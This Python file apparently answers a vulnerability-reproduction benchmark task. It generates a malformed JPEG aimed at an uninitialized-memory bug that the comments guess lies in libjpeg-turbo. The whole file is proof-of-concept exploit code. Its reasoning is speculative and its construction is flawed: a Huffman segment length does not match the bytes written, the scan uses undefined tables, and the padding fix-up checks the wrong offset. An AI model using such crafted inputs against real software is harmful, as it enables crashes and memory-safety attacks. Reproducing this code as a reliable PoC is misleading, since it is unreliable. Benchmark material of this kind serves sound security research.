import os
import subprocess
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This vulnerability is likely in libjpeg-turbo based on tj3Alloc() and MSan context
        # We'll craft a JPEG file that triggers uninitialized memory usage
        # by creating a valid JPEG but with unusual parameters that cause
        # buffer allocation issues
        
        # The PoC should be a JPEG file that causes issues during compression/transformation
        # Ground truth length is 2708 bytes, so we'll aim for similar size
        
        # We'll create a JPEG with multiple scans/progressive encoding to stress
        # the buffer allocation paths
        
        # Start with a valid JPEG header
        poc = bytearray()
        
        # SOI marker
        poc.extend(b'\xff\xd8')
        
        # APP0 marker (JFIF header)
        poc.extend(b'\xff\xe0')
        poc.extend(b'\x00\x10')  # Length
        poc.extend(b'JFIF\x00\x01\x02')  # Identifier and version
        poc.extend(b'\x00')  # Density units
        poc.extend(b'\x00\x01\x00\x01')  # X and Y density
        poc.extend(b'\x00\x00')  # Thumbnail
        
        # APP1 marker (EXIF - make it larger to reach target size)
        poc.extend(b'\xff\xe1')
        # We'll add a large APP1 segment to get closer to 2708 bytes
        app1_size = 2000
        poc.extend((app1_size + 2).to_bytes(2, 'big'))
        poc.extend(b'Exif\x00\x00')  # EXIF header
        # Fill with data (not critical for the vulnerability)
        poc.extend(b'X' * (app1_size - 6))
        
        # DQT marker (Quantization table)
        poc.extend(b'\xff\xdb')
        poc.extend(b'\x00\x43')  # Length
        poc.extend(b'\x00')  # Table info
        # Standard quantization table (64 bytes)
        std_qtable = [
            16, 11, 10, 16, 24, 40, 51, 61,
            12, 12, 14, 19, 26, 58, 60, 55,
            14, 13, 16, 24, 40, 57, 69, 56,
            14, 17, 22, 29, 51, 87, 80, 62,
            18, 22, 37, 56, 68,109,103, 77,
            24, 35, 55, 64, 81,104,113, 92,
            49, 64, 78, 87,103,121,120,101,
            72, 92, 95, 98,112,100,103, 99
        ]
        for val in std_qtable:
            poc.append(val)
        
        # SOF0 marker (Start of Frame, Baseline DCT)
        poc.extend(b'\xff\xc0')
        poc.extend(b'\x00\x11')  # Length
        poc.extend(b'\x08')  # Precision
        # Image dimensions: 64x64 (small but valid)
        poc.extend(b'\x00\x40')  # Height
        poc.extend(b'\x00\x40')  # Width
        poc.extend(b'\x03')  # 3 components
        
        # Component 1 (Y)
        poc.extend(b'\x01\x22\x00')  # ID, sampling factors, quantization table
        
        # Component 2 (Cb)
        poc.extend(b'\x02\x11\x00')  # Different sampling to trigger special paths
        
        # Component 3 (Cr)
        poc.extend(b'\x03\x11\x00')
        
        # DHT marker (Huffman table) - make it malformed to trigger edge cases
        poc.extend(b'\xff\xc4')
        dht_length = 150  # Unusually large to stress buffer allocation
        poc.extend(dht_length.to_bytes(2, 'big'))
        
        # Table class and ID
        poc.extend(b'\x00')  # DC table, ID 0
        
        # Number of codes for each length (16 bytes)
        # Create an unusual distribution that might trigger buffer issues
        counts = [0] * 16
        counts[0] = 1  # One code of length 1
        counts[1] = 2  # Two codes of length 2
        counts[2] = 4  # Four codes of length 3
        # Fill the rest to reach total codes
        total_codes = sum(counts)
        remaining = 162 - total_codes  # Want 162 total codes
        for i in range(3, 16):
            if remaining > 16:
                counts[i] = 16
                remaining -= 16
            else:
                counts[i] = remaining
                remaining = 0
                break
        
        for count in counts:
            poc.append(count)
        
        # Huffman values (162 values)
        for i in range(162):
            poc.append(i & 0xFF)
        
        # SOS marker (Start of Scan)
        poc.extend(b'\xff\xda')
        poc.extend(b'\x00\x0c')  # Length
        poc.extend(b'\x03')  # 3 components
        
        # Component specs
        poc.extend(b'\x01\x00')  # Component 1, DC table 0, AC table 0
        poc.extend(b'\x02\x11')  # Component 2, DC table 1, AC table 1
        poc.extend(b'\x03\x11')  # Component 3, DC table 1, AC table 1
        
        # Spectral selection and approximation
        poc.extend(b'\x00\x3f\x00')  # Full spectrum
        
        # Compressed image data
        # Add scan data that will trigger the vulnerability
        # We need exactly enough data to reach ~2708 bytes
        current_len = len(poc)
        target_len = 2708
        
        # Add scan data with specific patterns that might trigger
        # uninitialized memory reads in transformation buffers
        scan_data_len = target_len - current_len - 2  # -2 for EOI marker
        
        # Create scan data with patterns that might expose uninitialized memory
        # Use alternating patterns and invalid/edge Huffman codes
        scan_data = bytearray()
        
        # Start with valid entropy-coded segment
        scan_data.append(0xFF)  # Might be misinterpreted as marker
        scan_data.append(0x00)  # Stuffing byte
        
        # Add some DC coefficients
        scan_data.append(0b00000000)  # Zero run
        
        # Add AC coefficients with unusual patterns
        for i in range(scan_data_len - len(scan_data) - 10):
            # Create patterns that might trigger buffer overflow/underflow
            # during transformation
            if i % 50 == 0:
                scan_data.append(0xFF)  # Potential marker
                scan_data.append(0x00)  # Stuffing
            else:
                scan_data.append((i * 7) & 0xFF)  # Some data
        
        # Ensure we don't have accidental markers in the scan
        # Replace any 0xFF bytes with 0xFF 0x00
        i = 0
        while i < len(scan_data):
            if scan_data[i] == 0xFF and i + 1 < len(scan_data) and scan_data[i + 1] != 0x00:
                scan_data.insert(i + 1, 0x00)
                i += 1
            i += 1
        
        # Trim or extend to exact length
        scan_data = scan_data[:scan_data_len]
        if len(scan_data) < scan_data_len:
            scan_data.extend(b'\x00' * (scan_data_len - len(scan_data)))
        
        poc.extend(scan_data)
        
        # EOI marker
        poc.extend(b'\xff\xd9')
        
        # Verify length is close to target
        if len(poc) != target_len:
            # Adjust by adding padding in APP1 segment
            diff = target_len - len(poc)
            if diff > 0:
                # Insert padding in APP1
                app1_start = 4  # After SOI
                if poc[app1_start:app1_start+2] == b'\xff\xe0':
                    app1_len_pos = app1_start + 2
                    app1_len = int.from_bytes(poc[app1_len_pos:app1_len_pos+2], 'big')
                    # Increase APP1 length
                    poc[app1_len_pos:app1_len_pos+2] = (app1_len + diff).to_bytes(2, 'big')
                    # Insert padding at end of APP1 data
                    padding_pos = app1_len_pos + 2 + app1_len - 2  # -2 because length includes itself
                    poc[padding_pos:padding_pos] = b'P' * diff
        
        return bytes(poc)